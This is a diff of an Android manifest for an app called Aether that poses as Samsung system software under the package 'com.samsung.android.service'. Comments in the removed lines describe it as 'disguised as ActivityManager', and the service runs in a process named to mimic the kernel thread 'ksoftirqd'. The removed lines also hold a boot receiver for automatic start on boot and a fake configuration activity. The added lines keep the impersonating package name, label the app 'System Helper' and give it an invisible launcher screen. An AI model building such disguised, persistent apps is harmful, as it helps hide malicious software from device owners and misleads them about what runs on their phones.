@@ -1,54 +1,35 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.samsung.android.service">
+    package="com.samsung.android.service"
+    android:versionCode="1"
+    android:versionName="1.0.0">
 
-    <!-- Minimal permissions - looks like system service -->
+    <uses-sdk
+        android:minSdkVersion="24"
+        android:targetSdkVersion="34" />
+
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
     <application
-        android:label="@string/app_name"
-        android:icon="@android:drawable/ic_menu_manage"
-        android:theme="@android:style/Theme.NoDisplay"
+        android:label="System Helper"
+        android:icon="@drawable/ic_launcher"
         android:allowBackup="false"
-        android:debuggable="false"
-        android:enableOnBackInvokedCallback="false"
-        android:name=".AetherApplication"
-        android:directBootAware="true">
+        android:debuggable="false">
 
-        <!-- Main Service - disguised as ActivityManager -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:theme="@android:style/Theme.NoDisplay">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
         <service
             android:name=".AetherService"
-            android:enabled="true"
-            android:exported="false"
-            android:label="ActivityManager"
-            android:process=":ksoftirqd_handler"
-            android:foregroundServiceType="dataSync">
-        </service>
-
-        <!-- Boot Receiver - auto start on boot -->
-        <receiver
-            android:name=".BootReceiver"
-            android:enabled="true"
-            android:exported="true"
-            android:label="SystemBoot">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-                <category android:name="android.intent.category.DEFAULT" />
-            </intent-filter>
-        </receiver>
-
-        <!-- Fake Configuration Activity (never shown) -->
-        <activity
-            android:name=".ConfigActivity"
-            android:enabled="false"
-            android:exported="false"
-            android:theme="@android:style/Theme.NoDisplay"
-            android:label="System Configuration">
-        </activity>
+            android:exported="false" />
 
     </application>
 </manifest>
